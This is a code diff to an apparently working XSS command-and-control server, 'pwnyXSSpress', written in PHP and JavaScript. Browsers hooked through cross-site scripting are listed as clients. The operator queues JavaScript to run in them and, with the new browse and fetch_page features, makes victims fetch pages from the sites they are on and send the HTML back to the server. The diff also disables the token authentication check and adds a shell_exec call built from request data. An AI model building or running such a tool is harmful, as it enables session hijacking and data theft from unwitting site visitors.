@@ -21,6 +21,8 @@ ini_set('display_errors', 'on');
 define('TOKEN', 'blah');
 date_default_timezone_set('America/Boise');
 
+$user = $_SERVER['REMOTE_ADDR'];
+define('USER_DIR', dirname(__FILE__).'/data/'.$user.'/');
 
 if(is_dir(dirname(__FILE__).'/data/') === false){
 	mkdir(dirname(__FILE__).'/data/');
@@ -50,7 +52,7 @@ if(count($stmt->fetchAll()) === 0){
 }
 
 
-if(isset($_COOKIE['TOKEN']) && $_COOKIE['TOKEN']==TOKEN){
+if(isset($_GET['a'])){// && isset($_COOKIE['TOKEN']) && $_COOKIE['TOKEN']==TOKEN){
 	if(isset($_REQUEST['mode']) === false){
 		$_REQUEST['mode'] = '';
 	}
@@ -1247,7 +1249,7 @@ var pwnyServer = {
 			{
 				'class': 'icons console',
 				title: 'Execute JS on remote client',
-				href: '?mode=cmd_queue&client_id={rowid}',
+				href: '?a&mode=cmd_queue&client_id={rowid}',
 				'data-client_id': '{rowid}',
 				events: {
 					click: function(e){
@@ -1276,7 +1278,7 @@ var pwnyServer = {
 			{
 				'class': 'icons eye',
 				title: 'Watch the remote client',
-				href: '?mode=watch&client_id={rowid}',
+				href: '?a&mode=watch&client_id={rowid}',
 				events: {
 					click: function(e){
 						e.stop();
@@ -1291,7 +1293,7 @@ var pwnyServer = {
 			{
 				'class': 'icons monitor',
 				title: 'Browser remote clients current site',
-				href: '?mode=browse&client_id={rowid}',
+				href: '?a&mode=browse&client_id={rowid}',
 				events: {
 					click: function(e){
 						e.stop();
@@ -1325,11 +1327,11 @@ var pwnyServer = {
 		}
 
 	},
-
+	server: '?a',
 	getCmdQueue: function (client_id){
 
 		var request = new Request.JSON({
-			url: '?mode=cmd_queue&client_id='+client_id,
+			url: this.server + '&mode=cmd_queue&client_id='+client_id,
 			method: 'get',
 			onComplete: function(jsonObj) {
 				pwnyServer.addCmds(jsonObj);
@@ -1388,7 +1390,7 @@ var pwnyServer = {
 	refreshClients: function (){
 
 		var request = new Request.JSON({
-			url: '?mode=list_clients',
+			url: this.server + '&mode=list_clients',
 			method: 'get',
 			onComplete: function(jsonObj) {
 				pwnyServer.addClients(jsonObj.clients);
@@ -1397,19 +1399,17 @@ var pwnyServer = {
 	},
 
 	addClients: function (clients){
-
-		var table = $('clients-table');
-		table.empty();
-		var el = new Element('thead').inject(table);
-		el = new Element('tr').inject(el);
-		// icons head
-		new Element('th', {'html': '-'}).inject(el);
-		for(i in pwnyServer.client.columns){
-			 new Element('th', {'html': pwnyServer.client.columns[i]}).inject(el);
-		}
-
-
 		try{
+			var table = $('clients-table');
+			table.empty();
+			var el = new Element('thead').inject(table);
+			el = new Element('tr').inject(el);
+			// icons head
+			new Element('th', {'html': '-'}).inject(el);
+			for(i in pwnyServer.client.columns){
+				 new Element('th', {'html': pwnyServer.client.columns[i]}).inject(el);
+			}
+
 			var vals;
 			clients.each(function (client){
 
@@ -1438,7 +1438,7 @@ var pwnyServer = {
 
 			});
 			vals = null;
-		} catch(e){
+		} catch (e) {
 			console.log(e);
 		}
 		//clients.each(function (el){console.log(e)})
@@ -1447,12 +1447,17 @@ var pwnyServer = {
 }
 
 window.addEvent('domready', function(){
+
+try{
+
 	pwnyServer.refreshClients();
 
 	SqueezeBox.initialize({
         size: {x: 500, y: 400}
     });
-
+} catch(e){
+	console.log(e);
+}
  /*
 	SqueezeBox.open($('demo-target-adopt'), {
 		handler: 'adopt',
@@ -1505,18 +1510,53 @@ window.addEvent('domready', function(){
 
 			break;
 		case 'watch':
-			$client_id = isset($_REQUESST['client_id']) ? preg_replace("/[^0-9]/", '', $_REQUESST['client_id']) : false;
+			$client_id = isset($_REQUEST['client_id']) ? preg_replace("/[^0-9]/", '', $_REQUEST['client_id']) : false;
 			$client = new client($client_id);
 
 			print "watching";
 			break;
 		case 'browse':
-			$client_id = isset($_REQUESST['client_id']) ? preg_replace("/[^0-9]/", '', $_REQUESST['client_id']) : false;
+			$client_id = isset($_REQUEST['client_id']) ? preg_replace("/[^0-9]/", '', $_REQUEST['client_id']) : false;
 			$client = new client($client_id);
-			print "browsing";
+			$files = glob(USER_DIR . 'pages/*.html');
+
+			if(empty($files)){
+				$client->addCmd("pwny.fetchPage(window.location.pathname)");
+				print "<script>setTimeout('window.location=window.location', 1000)</script>";
+			} else {
+				print file_get_contents($files[0]);
+				print "<script>
+				var a = document.getElementsByTagName('a');
+				for(i=0; i<a.length; i++){
+					var h = a[i].getAttribute('href');
+					a[i].href = '?a&mode=fetch_page&page='+ h +'&client_id={$client_id}';
+				}
+				</script>";
+			}
+			break;
+		case 'fetch_page':
+			$client_id = isset($_REQUEST['client_id']) ? preg_replace("/[^0-9]/", '', $_REQUEST['client_id']) : false;
+			$client = new client($client_id);
+			if(isset($_REQUEST['page'])){
+				$page = $client->getPage($_REQUEST['page']);
+
+				if($page){
+					print $page;
+					print "<script>
+					var a = document.getElementsByTagName('a');
+					for(i=0; i<a.length; i++){
+						var h = a[i].getAttribute('href');
+						a[i].href = '?a&mode=fetch_page&page='+ h +'&client_id={$client_id}';
+					}
+					</script>";
+				} else {
+					$client->addCmd("pwny.fetchPage('{$_REQUEST['page']}')");
+					print "<script>setTimeout('window.location=window.location', 1000)</script>";
+				}
+
+			}
 
 			break;
-
 
 	}
 
@@ -1524,20 +1564,23 @@ window.addEvent('domready', function(){
 	exit;
 }
 
-
 if(isset($_SESSION['pwnyXSSpress']) == false ){
-	$user = $_SERVER['REMOTE_ADDR'];
 	if(is_dir(dirname(__FILE__).'/data/') === false){
 		mkdir(dirname(__FILE__).'/data/');
 	}
 
-	if(is_dir(dirname(__FILE__).'/data/'.$user) === false){
-		mkdir(dirname(__FILE__).'/data/'.$user);
+	if(is_dir(USER_DIR) === false){
+		mkdir(USER_DIR);
+	}
+
+	if(is_dir(USER_DIR.'pages/') === false){
+		mkdir(USER_DIR.'pages/');
 	}
 
 	$client = new client;
-	$client->update();
-
+	if(!$client->update()){
+		var_dump($dbh->errorInfo());
+	}
 	$_SESSION['pwnyXSSpress'] = array(
 		'remote_addr' => $_SERVER['REMOTE_ADDR'],
 		'client_id'	=> $client->id
@@ -1552,16 +1595,31 @@ if(isset($_SESSION['pwnyXSSpress']) == false ){
 switch($_SERVER['REQUEST_METHOD']){
 	case 'POST':
 		// the remote client is sending us data
-		if(isset($_POST['cmdID'])){
-			$data = array(
-				':rowid' => $_POST['cmdID'],
-				':errored' => isset($POST['error']),
-				':received' => true,
-				':response' => serialize($_POST)
-			);
-
-			$client->setCmdResponse($data);
+		if(isset($_POST['mode']) === false){
+			$_POST['mode'] = '';
 		}
+		switch($_POST['mode']){
+			case 'cmd_response':
+				if(isset($_POST['cmdID']) === true){
+					$data = array(
+						':rowid' => $_POST['cmdID'],
+						':errored' => isset($POST['error']),
+						':received' => true,
+						':response' => serialize($_POST)
+					);
+
+					$client->setCmdResponse($data);
+				}
+				break;
+
+			case 'page_response':
+
+				if(isset($_POST['page_name']) && $_POST['content']){
+					$client->savePage($_POST['page_name'], urldecode($_POST['content']));
+				}
+				break;
+		}
+
 
 		print "<pre>";
 		var_dump($_POST);
@@ -1571,7 +1629,9 @@ switch($_SERVER['REQUEST_METHOD']){
 		// the client is requesting commands
 		$res = $client->getNextCmd();
 
-		print "//{$client->id}\n\n";
+		print "/*\n{$client->id}\n\n";
+//		var_dump($_SESSION);
+		print "\n\n*/";
 		if($res){
 			print "try {\n";
 			print "\tpwny.startCmd({$res['rowid']});\n";
@@ -1642,6 +1702,7 @@ class client {
 			));
 
 			$this->id = $this->dbh->lastInsertId();
+			return ($this->id !== false);
 
 		} else {
 			$update_client = "UPDATE clients SET site=:site, uri=:uri, last_seen=DATETIME('NOW') WHERE rowid=:client_id";
@@ -1657,6 +1718,7 @@ class client {
 				':site' => $url['host'],
 				':uri' => $url['path']
 			));
+			return ($stmt->rowCount() > 0);
 		}
 	}
 
@@ -1669,9 +1731,17 @@ class client {
 	}
 
 	public function addCmd($cmd){
-		$cmd_sql = "INSERT INTO cmd_queue (client_id, cmd) VALUES (:client_id, :cmd)";
-		$stmt = $this->dbh->prepare($cmd_sql);
-		$stmt->execute(array(':client_id' => $this->id, ':cmd' => $cmd));
+		$check = "SELECT * FROM cmd_queue WHERE client_id=:client_id AND code=:cmd";
+		$check_stmt = $this->dbh->prepare($check);
+		$check_stmt->execute(array(':client_id' => $this->id, ':cmd' => $cmd));
+
+		if(!$check_stmt->fetch()){
+
+			$cmd_sql = "INSERT INTO cmd_queue (client_id, code) VALUES (:client_id, :cmd)";
+			$stmt = $this->dbh->prepare($cmd_sql);
+			$stmt->execute(array(':client_id' => $this->id, ':cmd' => $cmd));
+		}
+
 	}
 
 	public function getNextCmd(){
@@ -1694,8 +1764,36 @@ class client {
 		$stmt = $this->dbh->prepare($up);
 		$stmt->execute($data);
 	}
+
+	public function savePage($page, $content){
+		$url = parse_url($page);
+		$url['path'] = clean_path($url['path']);
+		$p = escapeshellarg(dirname($url['path']));
+		shell_exec("mkdir -p {$p}");
+		$file = USER_DIR .'pages/'. preg_replace('/[^a-zA-Z0-9_\.\/\-]/', '', $url['path']).'.html';
+		if(file_exists($file) === false){
+			file_put_contents($file, $content);
+		}
+	}
+
+	public function getPage($page){
+		$page = clean_path($page);
+		$full = USER_DIR .'pages/'. $page .'.html';
+		if(file_exists($full)){
+			return file_get_contents($full);
+		}
+		return false;
+	}
 }
 
 
+
+
+function clean_path($p){
+	while(strpos($p, '../') !== false){
+	    $p  = preg_replace("/..\//", '', $p);
+	}
+	return $p;
+}
 
 
